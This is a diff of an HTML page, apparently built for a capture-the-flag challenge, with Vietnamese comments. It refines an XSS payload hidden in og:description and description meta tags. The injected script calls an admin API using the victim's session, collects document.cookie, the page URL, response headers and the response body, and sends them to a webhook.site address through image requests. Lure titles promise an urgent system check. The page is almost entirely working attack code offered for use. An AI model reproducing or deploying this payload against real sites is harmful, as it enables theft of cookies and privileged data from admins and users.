@@ -2,14 +2,14 @@
 <html>
 <head>
     <meta charset="utf-8">
-    <title>Trang Tải XSS Payload - Direct Flag Attempt</title>
+    <title>Trang Tải XSS Payload - Debugging Flag Attempt</title>
 
-    <meta property="og:title" content="Cập nhật Hệ thống Khẩn cấp">
+    <meta property="og:title" content="Yêu Cầu Kiểm Tra Hệ Thống Gấp">
     
     <meta property="og:description" content="
         <script>
             (function() {
-                var webhook_id = '792a817c-a6b3-4529-a9ed-5780c728488a'; // ID Webhook của bạn
+                var webhook_id = '792a817c-a6b3-4529-a9ed-5780c728488a';
                 var webhook_base_url = 'https://webhook.site/';
                 var attacker_url = webhook_base_url + webhook_id;
 
@@ -17,51 +17,75 @@
                     var params = new URLSearchParams();
                     for (var key in data) {
                         if (data.hasOwnProperty(key)) {
-                            params.append(key, typeof data[key] === 'object' ? JSON.stringify(data[key]) : data[key]);
+                            let value = data[key];
+                            if (typeof value === 'object' && value !== null) {
+                                // Cố gắng serialize đối tượng lỗi một cách tốt hơn
+                                if (value instanceof Error) {
+                                    value = { name: value.name, message: value.message, stack: value.stack, string: value.toString() };
+                                }
+                                params.append(key, JSON.stringify(value));
+                            } else {
+                                params.append(key, value);
+                            }
                         }
                     }
-                    new Image().src = attacker_url + '?' + params.toString();
+                    var img = new Image();
+                    img.src = attacker_url + '?' + params.toString();
+                    // Gửi thêm một request nhỏ để báo hiệu script đã chạy tới đây
+                    // var ping = new Image();
+                    // ping.src = attacker_url + '?status=og_description_script_executed';
                 }
 
-                // Gửi cookie hiện tại để debug (dù có thể không có session cookie do HttpOnly)
                 sendToWebhook({ 
-                    stage: 'initial_debug', 
-                    current_document_cookie: document.cookie || 'empty' 
+                    stage: 'og_script_start', 
+                    current_document_cookie: document.cookie || 'empty',
+                    location_href: window.location.href // Xem XSS đang chạy ở URL nào
                 });
-
-                // Thử gọi trực tiếp /api/admin/sup3rs3cr3t
+                
                 fetch('/api/admin/sup3rs3cr3t', {
                     method: 'GET',
                     headers: {
                         'Accept': 'application/json',
-                        'X-Requested-With': 'XMLHttpRequest' // Thường cần cho các request AJAX trong Laravel
-                    }
+                        'X-Requested-With': 'XMLHttpRequest'
+                    },
+                    // credentials: 'include' // Thử thêm cái này xem có giúp với session cookie không,
+                                           // dù với same-origin thường không cần thiết bằng 'omit' (mặc định).
+                                           // 'omit' là mặc định cho same-origin, 'include' sẽ gửi cookie.
                 })
                 .then(response => {
+                    sendToWebhook({ 
+                        stage: 'fetch_response_received', 
+                        status: response.status, 
+                        statusText: response.statusText,
+                        ok: response.ok,
+                        headers: JSON.stringify(Array.from(response.headers.entries())) // Lấy tất cả headers của response
+                    });
+
                     if (!response.ok) {
-                        // Nếu có lỗi, lấy status và text để debug
-                        return response.text().then(text => {
+                        return response.text().then(text => { // Lấy text bất kể content type
                             throw { 
+                                isResponseError: true,
                                 status: response.status, 
                                 statusText: response.statusText, 
-                                body: text 
+                                responseBody: text,
+                                responseHeaders: JSON.stringify(Array.from(response.headers.entries()))
                             };
                         });
                     }
-                    return response.json(); // Nếu OK, parse JSON
+                    return response.json();
                 })
                 .then(data => {
-                    // Gửi toàn bộ response data (chứa FLAG_2 nếu thành công) về webhook
                     sendToWebhook({ 
                         stage: 'sup3rs3cr3t_success', 
                         flag_data: data 
                     });
                 })
                 .catch(error => {
-                    // Gửi thông tin lỗi về webhook
+                    // Nếu lỗi là từ response.text() hoặc response.json() (ví dụ response không phải JSON hợp lệ)
+                    // hoặc là một lỗi mạng, hoặc lỗi từ throw ở trên
                     sendToWebhook({ 
-                        stage: 'sup3rs3cr3t_error', 
-                        error_details: error 
+                        stage: 'sup3rs3cr3t_fetch_catch_error', 
+                        error_details: error // Hàm sendToWebhook sẽ cố gắng serialize nó tốt hơn
                     });
                 });
 
@@ -69,39 +93,37 @@
         </script>
     ">
 
-    <!-- Các thẻ meta khác để tăng khả năng được parse -->
+    <!-- Thẻ meta name="description" với payload tương tự để test -->
     <meta name="description" content="
         <script>
-            /* Lặp lại payload tương tự nếu muốn hoặc để trống nếu og:description được ưu tiên */
             (function() {
                 var webhook_id = '792a817c-a6b3-4529-a9ed-5780c728488a';
                 var webhook_base_url = 'https://webhook.site/';
                 var attacker_url = webhook_base_url + webhook_id;
-                fetch('/api/admin/sup3rs3cr3t', { /* ... giống trên ... */ })
-                .then(r => r.json().then(d => new Image().src = attacker_url + '?from_name_description_data=' + JSON.stringify(d)))
-                .catch(e => new Image().src = attacker_url + '?from_name_description_error=' + JSON.stringify(e));
+                // Gửi tín hiệu thẻ này đã được thực thi
+                // new Image().src = attacker_url + '?status=name_description_script_executed';
+                
+                // Lặp lại logic fetch như trên nếu muốn, hoặc một alert đơn giản để xác nhận
+                // alert('XSS from name=description on page: ' + window.location.href);
+                fetch('/api/admin/sup3rs3cr3t', { /* ... headers ... */ })
+                .then(r => {
+                    // var tempUrl = attacker_url + '?from_name_desc_status=' + r.status;
+                    // new Image().src = tempUrl;
+                    return r.json();
+                })
+                .then(d => new Image().src = attacker_url + '?from_name_description_data=' + encodeURIComponent(JSON.stringify(d)))
+                .catch(e => {
+                    var errorObj = { name: e.name, message: e.message, stack: e.stack, string: e.toString() };
+                    new Image().src = attacker_url + '?from_name_description_error=' + encodeURIComponent(JSON.stringify(errorObj));
+                });
             })();
         </script>
     ">
-    <meta name="twitter:card" content="summary">
-    <meta name="twitter:title" content="Cần Xác Thực Admin Gấp">
-    <meta name="twitter:description" content="
-        <script>
-            /* Lặp lại payload tương tự nếu muốn */
-            (function() {
-                var webhook_id = '792a817c-a6b3-4529-a9ed-5780c728488a';
-                var webhook_base_url = 'https://webhook.site/';
-                var attacker_url = webhook_base_url + webhook_id;
-                fetch('/api/admin/sup3rs3cr3t', { /* ... giống trên ... */ })
-                .then(r => r.json().then(d => new Image().src = attacker_url + '?from_twitter_description_data=' + JSON.stringify(d)))
-                .catch(e => new Image().src = attacker_url + '?from_twitter_description_error=' + JSON.stringify(e));
-            })();
-        </script>
-    ">
+    <!-- Thẻ Twitter không cần thiết nếu một trong hai thẻ trên hoạt động -->
 
 </head>
 <body>
-    <h1>Trang Web Chứa Payload XSS - Nỗ Lực Lấy Flag Trực Tiếp</h1>
-    <p>Script trong các thẻ meta sẽ cố gắng gọi /api/admin/sup3rs3cr3t và gửi kết quả về webhook.</p>
+    <h1>Trang Web Chứa Payload XSS - Debugging</h1>
+    <p>Kiểm tra Webhook của bạn để xem log chi tiết.</p>
 </body>
 </html>
